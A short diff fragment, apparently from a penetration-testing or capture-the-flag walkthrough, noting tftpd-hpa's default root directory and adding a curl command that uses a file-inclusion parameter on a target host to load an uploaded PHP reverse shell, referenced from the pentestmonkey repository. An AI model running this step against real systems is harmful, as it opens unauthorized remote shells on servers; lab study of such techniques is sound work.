@@ -145,3 +145,4 @@ https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-rev
 The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default
 root directory where files will be stored is /var/lib/tftpboot
 
+curl 'http://{target_IP}/?file=/var/lib/tftpboot/php-reverse-shell.php'
